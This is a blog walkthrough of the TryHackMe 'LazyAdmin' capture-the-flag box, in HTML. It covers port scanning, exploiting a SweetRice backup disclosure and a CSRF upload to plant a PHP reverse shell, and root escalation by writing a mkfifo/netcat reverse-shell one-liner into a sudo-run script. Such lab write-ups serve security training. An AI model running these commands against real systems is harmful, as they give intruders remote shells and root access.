<!DOCTYPE html>
<html lang="en">

<head><script src="/CCrashZer0/ccrashzer0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CCrashZer0/ccrashzer0.github.io/livereload" data-no-instant defer></script>
  <title>
  Lazy Admin: TryHackMe Writeup · CCrashZer0
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="CCrashZer0">
<meta name="description" content="
  Try Hack Me - LazyAdmin
  
    
    Link to heading
  

Have some fun! There might be multiple ways to get user access. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.

  Disclaimer - Your IP address will be different!
  
    
    Link to heading
  



  Objective
  
    
    Link to heading
  


What is the user flag?
What is the root flag?



  Scanning and Enumeration
  
    
    Link to heading
  

Command: nmap -sC -sV -oN nmap/intinal &lt;ipaddress&gt;">
<meta name="keywords" content="blog,developer,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Lazy Admin: TryHackMe Writeup">
  <meta name="twitter:description" content="Try Hack Me - LazyAdmin Link to heading Have some fun! There might be multiple ways to get user access. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.
Disclaimer - Your IP address will be different! Link to heading Objective Link to heading What is the user flag? What is the root flag? Scanning and Enumeration Link to heading Command: nmap -sC -sV -oN nmap/intinal &lt;ipaddress&gt;">

<meta property="og:url" content="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/lazyadmin/">
  <meta property="og:site_name" content="CCrashZer0">
  <meta property="og:title" content="Lazy Admin: TryHackMe Writeup">
  <meta property="og:description" content="Try Hack Me - LazyAdmin Link to heading Have some fun! There might be multiple ways to get user access. This is a TryHackMe box. To access this you must sign up to https://tryhackme.com/.
Disclaimer - Your IP address will be different! Link to heading Objective Link to heading What is the user flag? What is the root flag? Scanning and Enumeration Link to heading Command: nmap -sC -sV -oN nmap/intinal &lt;ipaddress&gt;">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="tutorials">
    <meta property="article:published_time" content="2020-07-19T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-07-19T00:00:00+00:00">




<link rel="canonical" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/lazyadmin/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder.css" media="screen">






  
    
    
    <link rel="stylesheet" href="/CCrashZer0/ccrashzer0.github.io/css/coder-dark.css" media="screen">
  



 




<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/">
      CCrashZer0
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/about/">About</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/tutorials/">Tutorials</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/CCrashZer0/ccrashzer0.github.io/projects/">Projects</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="http://localhost:1313/CCrashZer0/ccrashzer0.github.io/tutorials/lazyadmin/">
          Lazy Admin: TryHackMe Writeup
        </a>
      </h1>
    </header>

    <h1 id="try-hack-me---lazyadmin">
  Try Hack Me - LazyAdmin
  <a class="heading-link" href="#try-hack-me---lazyadmin">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Have some fun! There might be multiple ways to get user access. This is a TryHackMe box. To access this you must sign up to <a href="https://tryhackme.com/"  class="external-link" target="_blank" rel="noopener">https://tryhackme.com/</a>.</p>
<h2 id="disclaimer---your-ip-address-will-be-different">
  Disclaimer - Your IP address will be different!
  <a class="heading-link" href="#disclaimer---your-ip-address-will-be-different">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<hr>
<h2 id="objective">
  Objective
  <a class="heading-link" href="#objective">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ol>
<li>What is the user flag?</li>
<li>What is the root flag?</li>
</ol>
<hr>
<h2 id="scanning-and-enumeration">
  Scanning and Enumeration
  <a class="heading-link" href="#scanning-and-enumeration">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Command: <code>nmap -sC -sV -oN nmap/intinal &lt;ipaddress&gt;</code></p>
<p>Command Breakdown:</p>
<pre tabindex="0"><code>    -sC: Scan with default NSE scripts. Considered useful for discovery and safe

	-sV: Attempts to determine the version of the service running on port

	-oN: Normal output to the file normal.file
</code></pre><p>NMAP Results:</p>
<pre tabindex="0"><code>Nmap scan report for 10.10.3.179
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul  2 19:08:02 2020 -- 1 IP address (1 host up) scanned in 18.73 seconds
</code></pre><p>It looks like we only have two port open. Since one of those ports is 80 we are going to take the IP address and plug it into our broswer and see what we can come up with.</p>
<p><figure><img src="/images/LazyAdmin/webService.png">
</figure>

Well this certinly borring. It looks like we just have the default Apache page.<br>
It is time to TRY HARDER and look for hidden directories.<br>
Lets start by using gobuster.
Command: <code>gobuster -u http://10.10.3.179 -t 40 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</code><br>
Command Breakdown:</p>
<pre tabindex="0"><code>-u: Full URL (including scheme), or base domain name.

-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)

-w: Path to the wordlist used for brute forcing (use – for stdin)
</code></pre><figure><img src="/images/LazyAdmin/goBuster.png">
</figure>

<p>It seems that right away gobuster was able to find a directory called <code>/content</code>.<br>
Let&rsquo;s see if we can pull up the content directory in our browser.</p>
<h2 id="recon">
  Recon
  <a class="heading-link" href="#recon">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<hr>
<p><figure><img src="/images/LazyAdmin/content.png">
</figure>

There do not seem to be a lot of content in our content page&hellip; I wonder if that is by design!<br>
The key piece information we can take away from this is the name of the application that is being used.</p>
<p>So lets use Searchsploite to see if there are any vulnerability for this application.<br>
It appears that we have several known vulnerability for this appication. Lets start by seeing what this backup discloure is all about.<br>
<figure><img src="/images/LazyAdmin/backupDis.png">
</figure>

Accourding to the proof of concept there is an additional directory called <code>inc.mysql_backup</code>.<br>
I wonder if this is something that we can see in our browser.</p>
<p><figure><img src="/images/LazyAdmin/msqlBckup.png">
</figure>

Well.. Well.. What would you know we have access it this file. Now lets download it and see if we are able to get any useful information out of it.</p>
<p>Once I have opend up the mysql_backup file I searched for strings such as user, password, login, and admin. I was soon able to locate that I believed to be a user name and a password hash.</p>
<p><figure><img src="/images/LazyAdmin/creds.png">
</figure>

There is an online resource called <a href="https://crackstation.net/"  class="external-link" target="_blank" rel="noopener">crackstation</a>. We are going to use it to see if the hash that we found has be cracked before. So cross your fingers!<br>
<figure><img src="/images/LazyAdmin/cracked.png">
</figure>

Looks like this hash has been cracked before and now we have what could be a username and a password, but we still need to find some kind of login page.<br>
<br>
<br>
How about we check out some more to the vulnerability that showed up in searchsploit. We are going to look into the Cross-Site Request Forgery and see what it is all about.</p>
<p><figure><img src="/images/LazyAdmin/xss.png">
</figure>

This exploite gives us two peices of usful information. The first peice is the loging page for the sweetrices application and the second peice is that we can create a reverse shell.<br>
<br>
<br>
Lets test out url and see if it brings us to a login page.<br>
URL: <code>http://10.10.3.179/content/as</code><br>
<figure><img src="/images/LazyAdmin/login.png">
</figure>

<br>
Great we have a login page, now lets try out our username and password.<br>
BOOM!!! We are now logged into the SweetRice application. The next thing that we are going to do is try out the Cross-Site Request Forgery vulnerability.<br>
<figure><img src="/images/LazyAdmin/sweetRice.png">
</figure>

<br>
Before we use the Cross-Site Request Forgery vulnerability we will need to make some changes to it.<br>
The first thing that we will need to chang is under the form tag. Change the url after <code>action=</code> to the the following. <code>http://10.10.200.255/content/as/?type=ad&amp;mode=save</code><br>
REMEBER YOUR IP ADDRESS WILL BE DIFFERENT!</p>
<p>Secondly you will need to replace the php code with a reverse shell from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell"  class="external-link" target="_blank" rel="noopener">pentest monkey</a>. Simply replace all the code that is between <code>&lt;?php</code> and <code>?&gt;</code>. With the code you downloaded from pentest monkey.</p>
<p>Now the last theing that you will need to change is the IP address and the port that your reverser shell will call out to.<br>
The IP address is going to be the IP address of your computer and the port number should be a higher port.</p>
<pre tabindex="0"><code>  $ip = &#39;10.8.2.222&#39;;  // CHANGE THIS
  $port = 9999;       // CHANGE THIS
</code></pre><p>Before we pull the trigger on our exploit we need to set up a our listener.<br>
Command: <code>nc -lvnp 9999</code></p>
<p>Code Breakdown:</p>
<pre tabindex="0"><code>-l: listen mode, for inbound connects

-v: verbose [use twice to be more verbose]

-n: numeric-only IP addresses, no DNS

-p: local port number
</code></pre><p>Now that we have set up our listener we are going to fire off out exploit.<br>
Command: <code>firefox exploit.html</code><br>
Once finished we will need to open up our browser and go to <code>/content/inc/ads</code> from here we will see our exploit. I chose to name mine shell.php. Yours will be whatever you named yours.<br>
Lets click on our exploite and see if it trips our listener.<br>
<figure><img src="/images/LazyAdmin/listener.png">
</figure>
</p>
<br>
We have a successfull shell! Lets take a look aound and see if we are able to find any of our flages.  
<p>If we use the <code>ls</code> command we can see that there is a user in the home folder. It seems to the none other then your everyday IT guy.<br>
<figure><img src="/images/LazyAdmin/itGuy.png">
</figure>

Now that we know where the user.txt file is how about we see if it actally contains out flag.<br>
Command: <code>cat /home/itguy/user.txt</code></p>
<p><figure><img src="/images/LazyAdmin/userFlag.png">
</figure>

Objective one is complete.. We just found our user flag.</p>
<h2 id="privilege-escalation">
  Privilege Escalation
  <a class="heading-link" href="#privilege-escalation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<hr>
<p>Our next objective is to figure out how can escalation our privileges to a root user.<br>
We are going to start by checking to see what we can run as sudo by using the command of <code>sudo -l</code>.<br>
<br>
It looks like we are only able to run a perl script as admin. So it might be worth checking out this script and seeing what it does.<br>
<figure><img src="/images/LazyAdmin/sudo.png">
</figure>

After using the cat command to view the content of the <code>backup.pl</code>, it seem that this script calls an additional script call <code>copy.sh</code>.<br>
<figure><img src="/images/LazyAdmin/perlBackup.png">
</figure>

So now we have to chase the white rabbit and see what the <code>copy.sh</code> file does.<br>
<figure><img src="/images/LazyAdmin/copySh.png">
</figure>

At this point I am a litte confused because it seems that our <code>copy.sh</code> script is actually a reverse shell. You can read more about it on the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"  class="external-link" target="_blank" rel="noopener">pentest monkey</a> website.<br>
So in theory all we should have to do is modife the IP address in this file, set up a netcat listener, and boom we should have a root shell. Simple Right!</p>
<p><figure><img src="/images/LazyAdmin/nano.png">
</figure>

Wrong, It looks like I am not going to be able to open up the file in nano.. or vim.. vi is a clear nope .. and emacs gave the same errors as all the others. So what are we going to do?<br>
We are going to write a whole new reverse shell using the echo command and directing the output into a new <code>copy.sh</code> file.</p>
<p>Command: <code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.2.2221 8888 &gt;/tmp/f&quot; &gt; /etc/copy.sh</code></p>
<p>Once we have confirmed that our new reverse shell is calling out to our computer we can sent up a new netcat listener to port <code>8888</code> and then we fire off the pearl script.<br>
Command: <code>sudo /usr/bin/perl /home/itguy/backup.pl</code>
<figure><img src="/images/LazyAdmin/rootShell.png">
</figure>

Now that we have root access we need to try and find out root flag.</p>
<p><figure><img src="/images/LazyAdmin/rootFlag.png">
</figure>

And just like that we have collected the root flag and pwnd this challenge.</p>
<h1 id="congratulations-you-have-just-completed-the-lazy-admin-challenge">
  Congratulations you have just completed the Lazy Admin challenge!
  <a class="heading-link" href="#congratulations-you-have-just-completed-the-lazy-admin-challenge">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>

  </article>
</section>

  

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     CCrashZer0 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/CCrashZer0/ccrashzer0.github.io/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
